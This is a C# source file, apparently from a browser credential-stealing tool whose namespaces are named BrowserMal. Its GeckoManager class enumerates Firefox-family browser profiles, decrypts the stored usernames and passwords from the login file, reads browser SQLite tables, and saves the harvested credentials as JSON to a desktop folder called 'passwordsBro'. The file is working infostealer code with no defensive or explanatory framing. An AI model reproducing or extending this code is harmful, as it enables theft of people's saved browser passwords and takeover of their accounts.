using BrowserMal.Browser;
using BrowserMal.Model;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.IO;
using BrowserMal.Encryption;
using BrowserMal.Util;
using System;
using BrowserMal.SQLite;

namespace BrowserMal.Manager
{
    public class GeckoManager<T> : Manager<T>
    {
        private Dictionary<string, bool> readFiles;

        public GeckoManager(string tableName, SqliteTableModel sqliteTableModel) : base(tableName, sqliteTableModel)
        {
            readFiles = new Dictionary<string, bool>();
        }

        public override Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType = "")
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                List<string> profiles = GetAllProfiles(browser.Location);
                List<T> creds = new List<T>();

                if (_isSqlite)
                {
                    creds = SqliteFetch(profiles);

                    if (creds.Count == 0)
                        continue;

                    string rand = Path.GetRandomFileName();
                    _resultList.Add($"{browser.Name}_{_tableName}_{rand}.json", JsonUtil.GetJson<T>(creds));
                    Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName}_{rand}.json");
                    
                    continue;
                }

                creds = FetchFiles(profiles, browser.Name, browser.ProfileName);

                if (creds.Count == 0)
                    continue;

                _resultList.Add($"{browser.Name}_{_tableName.Replace(".json", "")}.json", JsonUtil.GetJson<T>(creds));
                Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName.Replace(".json", "")}.json");
            }

            return _resultList;
        }

        private List<T> FetchFiles(List<string> profiles, string name, string specificProfile)
        {
            List<T> result = new List<T>();

            foreach (string profile in profiles)
            {
                string loginFile = Path.Combine(profile, _tableName);

                if (File.Exists(loginFile))
                {
                    if (!loginFile.Contains(specificProfile) && !string.IsNullOrEmpty(specificProfile))
                        continue;

                    GeckoDecryption geckoDecryption = new GeckoDecryption();
                    geckoDecryption.Init(profile, name);

                    GeckoLogin geckoLogin;

                    using (StreamReader sr = new StreamReader(loginFile))
                    {
                        string json = sr.ReadToEnd();
                        geckoLogin = JsonConvert.DeserializeObject<GeckoLogin>(json);
                    }

                    foreach (GeckoLoginData login in geckoLogin.logins) 
                    {
                        string username = geckoDecryption.Decrypt(login.encryptedUsername);
                        string password = geckoDecryption.Decrypt(login.encryptedPassword);
                        string hostname = login.hostname;

                        T obj = CreateInstanceOfType(new object[] { hostname, username, password });
                        result.Add(obj);
                    }

                    break;
                }
            }

            return result;
        }

        private string[] GrabAndValidateSqliteValues(List<ColumnModel> columns, ref SqliteHandler sqLiteHandler, int row, out bool ignore)
        {
            string[] values = new string[columns.Count];

            for (int i = 0; i < columns.Count; i++)
            {
                string value = Format(
                    sqLiteHandler.GetValue(row, columns[i].GetName()),
                    columns[i].IsNeedsFormatting(),
                    columns[i].GetFunction()
                );

                if (columns[i].IsImportant() && string.IsNullOrEmpty(value))
                {
                    ignore = true;
                    return default;
                }

                values[i] = value;
            }

            ignore = false;
            return values;
        }

        private string Format(string value, bool needsFormatting, Func<object, object> function)
        {
            return (needsFormatting) ? (string)function(value) : value;
        }

        private List<T> SqliteFetch(List<string> profiles)
        {
            List<T> result = new List<T>();

            foreach (string profile in profiles)
            {
                string file = Path.Combine(profile, _fileName);

                if (CheckDuplicate(file))
                    continue;

                readFiles.Add(file, true);

                if (!File.Exists(file))
                    continue;

                SqliteHandler sqliteHandler = new SqliteHandler(file);
                sqliteHandler.ReadTable(_tableName);

                for (int i = 0; i <= sqliteHandler.GetRowCount() - 1; i++)
                {
                    try
                    {
                        string[] values = GrabAndValidateSqliteValues(_sqliteTableModel.GetColumns(), ref sqliteHandler, i, out bool ignore);
                        if (ignore)
                            continue;

                        T obj = CreateInstanceOfType(values);
                        result.Add(obj);
                    }
                    catch (Exception) { }
                }
            }

            return result;
        }

        private bool CheckDuplicate(string profileName) => readFiles.ContainsKey(profileName);
      
    }
}
